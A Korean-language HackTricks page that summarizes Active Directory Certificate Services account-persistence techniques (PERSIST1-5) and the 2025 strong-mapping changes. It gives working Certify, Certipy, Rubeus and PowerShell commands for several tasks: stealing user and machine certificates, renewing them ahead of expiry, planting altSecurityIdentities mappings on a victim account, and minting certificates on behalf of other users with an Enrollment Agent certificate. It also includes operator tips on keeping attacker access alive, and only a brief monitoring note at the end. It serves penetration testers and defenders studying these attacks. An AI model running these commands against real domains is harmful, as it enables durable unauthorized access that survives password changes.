# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**이는 [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)의 훌륭한 연구에서 account persistence 챕터를 간략히 요약한 내용입니다.**<sup>[[7]](#references)</sup>

## 인증서를 사용한 활성 사용자 자격 증명 탈취 이해 – PERSIST1

도메인 인증을 허용하는 인증서를 사용자가 요청할 수 있는 시나리오에서는, 공격자가 이 인증서를 요청하고 탈취하여 네트워크에서 persistence를 유지할 수 있습니다. 기본적으로 Active Directory의 `User` template은 이러한 요청을 허용하지만, 경우에 따라 비활성화되어 있을 수 있습니다.<sup>[[3]](#references)[[7]](#references)</sup>

[Certify](https://github.com/GhostPack/Certify) 또는 [Certipy](https://github.com/ly4k/Certipy)를 사용하면 client authentication을 허용하는 활성화된 template을 검색한 다음 하나를 요청할 수 있습니다:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
인증서의 강력함은 인증서가 유효한 상태로 유지되는 한 비밀번호가 변경되더라도 해당 인증서의 소유자인 사용자로 인증할 수 있다는 점에 있습니다.

PEM을 PFX로 변환한 후 이를 사용하여 TGT를 얻을 수 있습니다:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> 참고: 다른 기법( THEFT sections 참조)과 결합하면 certificate-based auth를 통해 LSASS를 건드리지 않고, 심지어 non-elevated context에서도 지속적인 access를 확보할 수 있습니다.

## Certificates를 사용한 Machine Persistence 확보 - PERSIST2

공격자가 호스트에서 elevated privileges를 보유한 경우, 기본 `Machine` template을 사용하여 침해된 시스템의 machine account로 certificate를 등록할 수 있습니다. machine으로 인증하면 로컬 services에 대해 S4U2Self를 사용할 수 있으며, 지속적인 host persistence를 제공할 수 있습니다:<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## 인증서 갱신을 통한 Persistence 확장 - PERSIST3

인증서 템플릿의 유효 기간과 갱신 기간을 악용하면 공격자는 장기적인 액세스를 유지할 수 있습니다. 이전에 발급된 인증서와 해당 private key를 보유하고 있다면, 만료 전에 갱신하여 원래 principal과 연결된 추가 요청 아티팩트를 남기지 않고 새롭고 장기간 유효한 credential을 얻을 수 있습니다.<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> 운영 팁: 공격자가 보유한 PFX 파일의 수명을 추적하고 일찍 갱신하세요. 갱신하면 최신 인증서에 최신 SID mapping extension이 포함될 수도 있어, 더 엄격한 DC mapping 규칙에서도 인증서를 계속 사용할 수 있습니다(다음 섹션 참조).

## 명시적 인증서 매핑 심기 (altSecurityIdentities) – PERSIST4

대상 계정의 `altSecurityIdentities` attribute에 쓸 수 있다면, 공격자가 제어하는 인증서를 해당 계정에 명시적으로 매핑할 수 있습니다. 이 매핑은 password 변경 이후에도 유지되며, strong mapping 형식을 사용하면 최신 DC enforcement 환경에서도 계속 작동합니다.<sup>[[2]](#references)</sup>

High-level flow:

1. 자신이 제어하는 client-auth 인증서를 획득하거나 발급합니다(예: 자신의 계정으로 `User` template을 enroll).
2. 인증서에서 strong identifier를 추출합니다(Issuer+Serial, SKI 또는 SHA1-PublicKey).
3. 해당 identifier를 사용하여 victim principal의 `altSecurityIdentities`에 명시적 매핑을 추가합니다.
4. 인증서로 authenticate합니다. 그러면 DC가 명시적 매핑을 통해 해당 인증서를 victim에 매핑합니다.

Example (PowerShell) using a strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
그런 다음 PFX로 인증합니다. Certipy가 직접 TGT를 가져옵니다:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### 강력한 `altSecurityIdentities` 매핑 구축

실제로 **Issuer+Serial** 및 **SKI** 매핑은 공격자가 보유한 인증서에서 구축하기 가장 쉬운 강력한 형식입니다. 이는 **2025년 2월 11일** 이후 DC가 기본적으로 **Full Enforcement**를 적용하고 weak mappings의 신뢰성이 떨어지기 때문에 중요합니다.<sup>[[1]](#references)</sup>
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
참고
- 강력한 매핑 유형만 사용하세요: `X509IssuerSerialNumber`, `X509SKI`, 또는 `X509SHA1PublicKey`. 약한 형식(Subject/Issuer, Subject-only, RFC822 email)은 더 이상 사용되지 않으며 DC 정책으로 차단할 수 있습니다.
- 이 매핑은 **user** 및 **computer** 객체 모두에서 작동하므로, 컴퓨터 계정의 `altSecurityIdentities`에 대한 쓰기 권한만 있어도 해당 머신으로 지속성을 유지할 수 있습니다.
- 인증서 체인은 DC가 신뢰하는 루트까지 구축되어야 합니다. NTAuth의 Enterprise CA는 일반적으로 신뢰되며, 일부 환경에서는 public CA도 신뢰합니다.
- DC에 Smart Card Logon EKU가 없거나 `KDC_ERR_PADATA_TYPE_NOSUPP`를 반환하여 PKINIT가 실패하는 경우에도 Schannel authentication은 persistence에 유용합니다.

#### 2025+ `Issuer/SID` 명시적 매핑

**2025년 9월 9일** security update가 적용된 **Windows Server 2022+** 도메인 컨트롤러에서 Microsoft는 동일한 CA에서 인증서를 재발급해도 유지되는 특성 때문에 persistence에 매력적인 또 다른 강력한 명시적 매핑 형식을 추가했습니다:<sup>[[6]](#references)</sup>
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
운영 측면에서 이는 이전의 강력한 형식과 다릅니다:
- `Issuer+Serial`은 **하나의 정확한 certificate**를 pin합니다.
- `SKI` / `SHA1-PUKEY`는 **하나의 keypair**를 pin합니다.
- `Issuer/SID`는 **발급 CA + 대상 SID**를 pin하므로, 동일한 CA에서 갱신되거나 재발급된 certificate도 `altSecurityIdentities`를 다시 작성하지 않고 계속 사용할 수 있습니다.

요구 사항 및 주의 사항
- logon에 사용되는 certificate에는 SID security extension에 대상 account SID가 실제로 포함되어 있어야 합니다.
- 이 형식은 SID extension을 생략하는 `ESC9` / `ESC16` 유형의 certificate에는 유용하지 않습니다. 이러한 경우 `Issuer+Serial`, `SKI` 또는 `SHA1-PUKEY`로 대체합니다.

약한 명시적 매핑과 attack path에 대한 자세한 내용은 다음을 참조하세요:


{{#ref}}
domain-escalation.md
{{#endref}}

## Persistence로서의 Enrollment Agent – PERSIST5

유효한 Certificate Request Agent/Enrollment Agent certificate를 획득하면 언제든지 사용자를 대신해 새로운 logon-capable certificate를 발급하고, agent PFX를 persistence token으로 offline 상태로 유지할 수 있습니다. Abuse workflow:<sup>[[7]](#references)</sup>
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
에이전트 인증서 또는 template 권한을 revoke해야 이 persistence를 제거할 수 있습니다.

운영 참고 사항
- 최신 `Certipy` 버전은 `-on-behalf-of`와 `-renew`를 모두 지원하므로, Enrollment Agent PFX를 보유한 attacker는 원래 대상 account에 다시 접근하지 않고도 leaf certificate를 발급하고 이후 갱신할 수 있습니다.<sup>[[4]](#references)</sup>
- PKINIT 기반 TGT retrieval이 불가능하더라도, 생성된 on-behalf-of certificate는 `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`을 사용한 Schannel authentication에 여전히 사용할 수 있습니다.<sup>[[5]](#references)</sup>

## PKINIT 실패 시 Persisted Certificates 사용

DC에 Smart Card Logon-capable certificate가 없으면 PKINIT를 통한 certificate logon이 `KDC_ERR_PADATA_TYPE_NOSUPP`와 함께 실패할 수 있습니다. 그렇다고 해서 persistence primitive가 무효화되는 것은 아닙니다. 동일한 PFX를 Schannel-authenticated LDAP access에 여전히 사용할 수 있는 경우가 많습니다.<sup>[[5]](#references)</sup>
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
이는 PERSIST4/PERSIST5 이후에 특히 유용합니다. Linux/macOS에서 계속 작업하면서 [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) 배치나 쓰기 가능한 delegation attribute 편집과 같은 다른 directory persistence 작업을 연쇄적으로 수행할 수 있기 때문입니다.

## 2025 Strong Certificate Mapping Enforcement: Persistence에 미치는 영향

Microsoft KB5014754는 domain controller에 Strong Certificate Mapping Enforcement를 도입했습니다. **2025년 2월 11일**부터 DC는 약하거나 모호한 mapping에 대해 기본적으로 **Full Enforcement**를 적용하며, **2025년 9월 9일** security update가 적용된 DC에서는 더 이상 이전 Compatibility-mode fallback을 지원하지 않습니다.<sup>[[1]](#references)</sup> 실질적인 영향은 다음과 같습니다.

- SID mapping extension이 없는 2022년 이전 certificate는 DC가 Full Enforcement 상태일 때 implicit mapping에 실패할 수 있습니다. 공격자는 AD CS를 통해 certificate를 갱신하여 SID extension을 포함시키거나, `altSecurityIdentities`에 강력한 explicit mapping을 심어 access를 유지할 수 있습니다(PERSIST4).
- 강력한 형식(`Issuer+Serial`, `SKI`, `SHA1-PUKEY`, 최신 DC의 `Issuer/SID`)을 사용하는 explicit mapping은 계속 작동합니다. 취약한 형식(Issuer/Subject, Subject-only, RFC822)은 차단될 수 있으므로 persistence에 사용하지 않아야 합니다.
- 취약한 mapping이 계속 작동하는 것처럼 보인다면, 신뢰할 수 있는 장기 persistence 경로가 아니라 patch되지 않았거나 다르게 구성된 DC에 연결된 것으로 간주해야 합니다.
- SID extension을 억제하는 `ESC9` / `ESC16` 방식의 issuance 경로에서는 `Issuer/SID`를 사용할 수 없으므로, fallback strong mapping 또는 일반 template을 통한 renewal이 실용적인 persistence 옵션이 됩니다.

Administrators는 다음을 monitor하고 alert를 설정해야 합니다.

- `altSecurityIdentities` 변경 및 Enrollment Agent와 User certificate의 issuance/renewal
- on-behalf-of request와 비정상적인 renewal pattern에 대한 CA issuance log

## References

- [1] [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [3] [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [4] [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [5] [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [6] [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)
- [7] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
